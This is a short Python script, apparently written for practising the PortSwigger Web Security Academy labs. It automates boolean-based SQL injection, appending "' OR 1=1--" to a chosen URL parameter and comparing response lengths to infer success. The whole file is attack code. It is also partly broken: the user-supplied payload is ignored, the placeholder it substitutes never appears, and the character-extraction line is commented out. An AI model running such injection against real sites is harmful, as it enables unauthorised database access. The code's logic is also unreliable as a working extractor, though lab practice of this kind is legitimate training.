### This script created to practice on Burp https://portswigger.net/web-security

import requests, os
import argparse
from urllib.parse import parse_qs, urlparse, unquote

parser = argparse.ArgumentParser()
parser.add_argument("url", help="Target URL")
parser.add_argument("p", help="Parameter to Inject")
parser.add_argument("payload", help="Payload")
args = parser.parse_args()

target = args.url
p =  args.p
s = requests.session()
l = s.get(target)
ll = int(l.headers['Content-Length'])
extract = ""
print(ll)

def sqli(target, payload):
    o = urlparse(target)
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    if p in query:
        strng = query[p][0]


        for i in range(32, 126):
            #ur = url.
            query[p] = strng + payload.replace("[INJ]", str(i))
            r = s.get(url, params=query)

            print(unquote(r.url))
            print("Length: "+r.headers['Content-Length'])
            if int(r.headers['Content-Length']) > ll:
                global extract
                #extract += chr(i)
                print("Found: "+str(extract))
            elif "Congratulations" in r.text:
                print("Solved")
            else:
                print("try something better")

for i in range(1, 20):
    payload = F"' OR 1=1--".format(i)
    sqli(target, payload)
print(extract)
